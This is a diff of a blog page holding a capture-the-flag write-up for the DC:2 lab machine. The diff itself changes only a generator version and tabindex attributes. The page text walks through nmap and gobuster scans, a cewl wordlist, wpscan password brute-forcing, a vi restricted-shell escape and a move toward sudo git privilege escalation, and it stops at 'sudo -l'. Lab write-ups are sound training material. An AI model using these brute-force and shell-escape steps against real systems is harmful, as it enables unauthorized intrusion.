@@ -5,7 +5,7 @@
 <meta name=viewport content="width=device-width,initial-scale=1">
 <meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1">
 <meta name=author content="Nasef">
-<meta name=generator content="Hugo 0.87.0">
+<meta name=generator content="Hugo 0.88.1">
 <link rel=stylesheet href=https://iamnasef.com/css/bootstrap.min.css>
 <link rel=stylesheet href=https://iamnasef.com/font-awesome/css/font-awesome.min.css>
 <link href=https://iamnasef.com/scss/style.min.css rel=stylesheet>
@@ -60,7 +60,7 @@ Contact Me
 <p>DC:2 is a machine in which I used an enumration to credintials and then exploited the misconfigured sudo permissions to get root Access.</p>
 <h3 id=scanning>Scanning</h3>
 <p>As always, I started scanning with Nmap</p>
-<pre><code>root@kali:/home/kali# nmap -sC -sV -p- 192.168.198.142
+<pre tabindex=0><code>root@kali:/home/kali# nmap -sC -sV -p- 192.168.198.142
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-27 06:55 EDT
 Nmap scan report for dc-2 (192.168.198.142)
 Host is up (0.00064s latency).
@@ -84,7 +84,7 @@ Nmap done: 1 IP address (1 host up) scanned in 44.20 seconds
 </code></pre><p>Http and ssh are open.</p>
 <h3 id=directory-enumeration>Directory Enumeration</h3>
 <p>Then I enumerated directories and files using gobuster</p>
-<pre><code>root@kali:/home/kali# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://dc-2/ -e php,html,txt,flag,js,json
+<pre tabindex=0><code>root@kali:/home/kali# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://dc-2/ -e php,html,txt,flag,js,json
 ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
@@ -111,7 +111,7 @@ http://dc-2/server-status (Status: 403)
 <p>Using manual browsing I found the first flag.</p>
 <p><img src=/images/blog/005/1.png alt=Username></p>
 <p>This message implied that I use this tool to generate the wordlist</p>
-<pre><code>kali@kali:~$ cewl http://dc-2 &gt; Desktop/wl
+<pre tabindex=0><code>kali@kali:~$ cewl http://dc-2 &gt; Desktop/wl
 </code></pre><p>I was curios of how I use this wordlist, I had many thoughts</p>
 <ol>
 <li>Use this wordlist in gobuster to enumerate the directories (Failed)</li>
@@ -119,7 +119,7 @@ http://dc-2/server-status (Status: 403)
 <li>Use this wordlist in Burpsuite to enumerate users (Failed)</li>
 <li>I used the wordlist in wpscan to bruteforce the password (Worked!)</li>
 </ol>
-<pre><code>root@kali:/home/kali# wpscan -P Desktop/wl --url http://dc-2
+<pre tabindex=0><code>root@kali:/home/kali# wpscan -P Desktop/wl --url http://dc-2
 _______________________________________________________________
          __          _______   _____
          \ \        / /  __ \ / ____|
@@ -245,7 +245,7 @@ Trying admin / log Time: 00:00:44 &lt;==========================================
 <img src=/images/blog/005/2.png alt=Username></p>
 <h3 id=from-tom-to-jerry>From Tom to Jerry</h3>
 <p>The first thing I thought of from this hint is to ssh. So, I sshed as Tom but with restriected shell ! I bypassed it using using vi.</p>
-<pre><code>root@kali:/home/kali# ssh -p 7744 tom@192.168.198.142
+<pre tabindex=0><code>root@kali:/home/kali# ssh -p 7744 tom@192.168.198.142
 tom@192.168.198.142's password: 
 
 The programs included with the Debian GNU/Linux system are free software;
@@ -260,11 +260,11 @@ vi
 [ESC] :set shell=/bin/bash
 [ESC] :shell
 </code></pre><p>I found the third flag in the home directory of Tom</p>
-<pre><code>$ cat flag3.txt
+<pre tabindex=0><code>$ cat flag3.txt
 Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
 
 </code></pre><p>So, I just had to su to jerry and found the fourth flag</p>
-<pre><code>tom@DC-2:~$ /bin/su jerry
+<pre tabindex=0><code>tom@DC-2:~$ /bin/su jerry
 Password: 
 jerry@DC-2:/home/tom$ ls
 ls: cannot open directory .: Permission denied
@@ -281,7 +281,7 @@ No hints here - you're on your own now.  :-)
 Go on - git outta here!!!!
 </code></pre><h3 id=privilege-escalation>Privilege Escalation</h3>
 <p>I ran diffrenet Enumeration scripts and found an intersting sudo privilege which allows us to run git as root. after searching in the gtfio of how to get a root shell. I ran the following commands.</p>
-<pre><code>erry@DC-2:~$ sudo -l
+<pre tabindex=0><code>erry@DC-2:~$ sudo -l
 Matching Defaults entries for jerry on DC-2:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
